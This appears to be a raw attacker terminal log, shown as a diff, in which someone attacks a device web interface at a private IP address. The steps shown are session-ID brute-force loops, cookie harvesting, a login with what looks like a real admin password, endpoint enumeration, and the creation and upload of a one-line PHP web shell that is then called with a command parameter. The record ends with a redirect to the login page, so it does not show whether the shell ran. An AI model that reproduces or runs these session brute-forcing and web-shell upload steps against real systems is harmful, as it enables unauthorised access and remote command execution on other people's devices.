@@ -1,0 +1,113 @@
+─╼ $curl -v "http://172.30.1.254:8899/status/system_info" -H "Cookie: user_id=admin; sid=bdb6e0c6e0db0169" -v
+
+
+
+┌─[user@parrot]─[~]
+└──╼ $curl -v "http://172.30.1.254:8899/status/system_info" -H "Cookie: user_id=admin; sid=bdb6e0c6e0db0169"^C
+┌─[✗]─[user@parrot]─[~]
+└──╼ $curl -v "http://172.30.1.254:8899/status/system_info" -H "Cookie: user_id=admin; sid=bdb6e0c6e0db0169" 2>&1 | grep -i "Location:"
+┌─[✗]─[user@parrot]─[~]
+└──╼ $curl -v "http://172.30.1.254:8899/status/system_info" -H "Cookie: user_id=admin; sid=bdb6e0c6e0db0169" 2>&1 | grep -i "Location :"
+┌─[✗]─[user@parrot]─[~]
+└──╼ $curl -v "http://172.30.1.254:8899/status/system_info" -H "Cookie: user_id=admin; sid=bdb6e0c6e0db0169" 2>&1 | grep -i "Location : "
+┌─[✗]─[user@parrot]─[~]
+└──╼ $curl -v "http://172.30.1.254:8899/status/system_info" -H "Cookie: user_id=admin; sid=bdb6e0c6e0db0169" 2>&1 | grep -i "Location : "
+┌─[✗]─[user@parrot]─[~]
+└──╼ $for i in {214000..215000}; do
+    curl -s "http://172.30.1.254:8899/status/system_info" \
+    -H "Cookie: sid=$i" | grep -q "System Info" && echo "Valid SID: $i"
+done
+┌─[✗]─[user@parrot]─[~]
+└──╼ $for i in {214000..215000}; do     curl -s "http://172.30.1.254:8899/status/system_info"     -H "Cookie: sid=$i"
+> 
+> ^C
+┌─[✗]─[user@parrot]─[~]
+└──╼ $for i in {214000..215000}; do     curl -s "http://172.30.1.254:8899/status/system_info"     -H "Cookie: sid=$i"; 
+> ^C
+┌─[✗]─[user@parrot]─[~]
+└──╼ $for i in {214000..215000}; do     curl -s "http://172.30.1.254:8899/status/system_info"     -H "Cookie: sid=$i" 
+> ^C
+┌─[✗]─[user@parrot]─[~]
+└──╼ $for i in {214000..215000}; do     curl -s "http://172.30.1.254:8899/status/system_info"     -H "Cookie: sid=$i";
+> for i in {214000..215000}; do     curl -s "http://172.30.1.254:8899/status/system_info"     -H "Cookie: sid=$i"; done
+> ^C
+┌─[✗]─[user@parrot]─[~]
+└──╼ $for i in {214000..215000}; do     curl -s "http://172.30.1.254:8899/status/system_info"     -H "Cookie: sid=$i"; for i in {214000..215000}; do     curl -s "http://172.30.1.254:8899/status/system_info"     -H "Cookie: sid=$i"; done
+> done
+
+
+
+
+┌─[✗]─[user@parrot]─[~]
+└──╼ $date +%s && curl -I "http://172.30.1.254:8899/login" | grep -i "Set-Cookie"
+1750271583
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     9    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+┌─[✗]─[user@parrot]─[~]
+└──╼ $date +%s && curl -I "http://172.30.1.254:8899/login" | grep -i "Set-Cookie"
+1750271615
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     9    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+┌─[✗]─[user@parrot]─[~]
+└──╼ $date +%s && curl -I "http://172.30.1.254:8899/login" | grep -i "Set-Cookie"
+1750271624
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     9    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+┌─[✗]─[user@parrot]─[~]
+└──╼ $date +%s && curl -I "http://172.30.1.254:8899/login" | grep -i "Set-Cookie"
+1750271646
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     9    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+┌─[✗]─[user@parrot]─[~]
+└──╼ $curl -v "http://172.30.1.254:8899/login" \
+  -d "user_id=admin&user_pwd=$(echo -n 'n7udphbwws@Psswd12345' | base64)" \
+  2>&1 | grep -i "Set-Cookie"
+┌─[✗]─[user@parrot]─[~]
+└──╼ $for i in {1..10}; do
+  curl -v "http://172.30.1.254:8899/login" -d "user_id=test&user_pwd=test" 2>&1 | grep -i "Set-Cookie" >> cookies.txt
+done
+┌─[✗]─[user@parrot]─[~]
+└──╼ $for i in {1..10}; do   curl -v "http://172.30.1.254:8899/login" -d "user_id=test&user_pwd=test" 2>&1 | grep -i "Set-Cookie" >> cookies.txt; done
+┌─[✗]─[user@parrot]─[~]
+└──╼ $for i in {1..10}; do   curl -v "http://172.30.1.254:8899/login" -d "user_id=test&user_pwd=test" 2>&1 | grep -i "Set-Cookie" >> cookies.txt; d^Ce
+┌─[✗]─[user@parrot]─[~]
+└──╼ $l
+cookies.txt  Documents/  Music/     Public/    Templates/
+Desktop/     Downloads/  Pictures/  shell.php  Videos/
+┌─[user@parrot]─[~]
+└──╼ $head cookies.txt
+┌─[user@parrot]─[~]
+└──╼ $cat cookies.txt
+┌─[user@parrot]─[~]
+└──╼ $for i in {1..10}; do   curl -v "http://172.30.1.254:8899/login" -d "user_id=test&user_pwd=test" 2>&1 | grep -i "Set-Cookie" >> cookies.txt; done
+
+
+
+└──╼ $curl -H "Cookie: user_id=admin; sid=214c5f8e6792f284" "http://172.30.1.254:8899/status/system_info"
+<p>Moved <a href='/login'>here</a>.
+┌─[user@parrot]─[~]
+└──╼ $for endpoint in "system_info" "debug" "admin_panel" "config"; do
+    curl -s -o /dev/null -w "%{http_code} %{url_effective}\n" \
+    "http://172.30.1.254:8899/status/$endpoint" \
+    -H "Cookie: user_id=admin; sid=214c5f8e6792f284"
+done
+302 http://172.30.1.254:8899/status/system_info
+302 http://172.30.1.254:8899/status/debug
+302 http://172.30.1.254:8899/status/admin_panel
+302 http://172.30.1.254:8899/status/config
+┌─[user@parrot]─[~]
+└──╼ $echo '<?php system($_GET["cmd"]); ?>' > shell.php
+curl -X POST -F "file=@shell.php" "http://172.30.1.254:8899/upload" \
+-H "Cookie: sid=214c5f8e6792f284"
+{
+	"success":true,
+	"data":"success",
+	"tmp_data":"",
+	"err_desc":""
+}┌─[user@parrot]─[~]
+└──╼ $curl "http://172.30.1.254:8899/uploads/shell.php?cmd=id"
+<p>Moved <a href='/login'>here</a>.
